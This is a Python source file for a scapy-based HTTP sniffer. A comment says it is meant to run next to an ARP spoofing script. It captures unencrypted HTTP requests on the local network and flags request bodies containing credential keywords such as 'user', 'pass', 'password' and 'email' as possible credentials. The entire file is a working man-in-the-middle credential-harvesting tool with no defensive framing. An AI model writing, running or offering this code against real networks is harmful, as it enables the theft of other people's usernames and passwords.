# The idea of the HTTPSniffer is to execute this with 2 terminals, one with the spoofarp running and
# another with this script

from termcolor import colored
from scapy.layers import http
import scapy.all as scapy
import signal
import sys

def def_handler(sig, frame):
    print("\n\n")
    color_helper("Forcibly Exiting Program", "Error")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def color_helper(text, type, padx="", pady=""):
    if type.lower() == "error":
        print(f"{padx}{colored('[!', 'yellow')}{colored(' Sniffer Error ', 'red')}{colored('>]', 'yellow')} {colored(text, 'yellow')}{pady}")

    elif type.lower() == "info":
        print(f"{padx}{colored('[!', 'yellow')}{colored(' Sniffer Info ', 'cyan')}{colored('>]', 'yellow')} {colored(text, 'cyan')}{pady}")

    elif type.lower() == "creds":
        print(f"{padx}{colored('[!', 'red')}{colored(' Sniffer Domain ', 'yellow')}{colored('>]', 'red')} {colored(text, 'red')}{pady}")

def process_packet(packet):
    cred_keywords = ["login", "user", "uname", "username", "usuario", "pass", "pwd", "passwd", "password", "contraseña", "mail", "email", "correo"]

    if packet.haslayer(http.HTTPRequest):
        method = packet[http.HTTPRequest].Method.decode()
        url = f"{method.upper()} http://{packet[http.HTTPRequest].Host.decode()}{packet[http.HTTPRequest].Path.decode()}"

        if packet.haslayer(scapy.Raw):
            try:
                response = packet[scapy.Raw].load.decode()
                for keyword in cred_keywords:
                    color_helper(f"HTTP request detected: - URL: {url} - Params: {response}", "info")
                    if keyword in response:
                        color_helper(f"Posible credentials: {response}", "creds", "\n\t", "\n")
            except:
                pass
        else:
            color_helper(f"HTTP request detected - URL: {url}", "info")

def sniff(interface):
    color_helper(f"Starting sniffing HTTP packets in network: iface {interface}", "info")
    scapy.sniff(iface=interface, prn=process_packet, store=0)

def main():
    # interface = "ens33"
    interface = scapy.conf.iface
    sniff(interface)


if __name__ == "__main__":
    main()
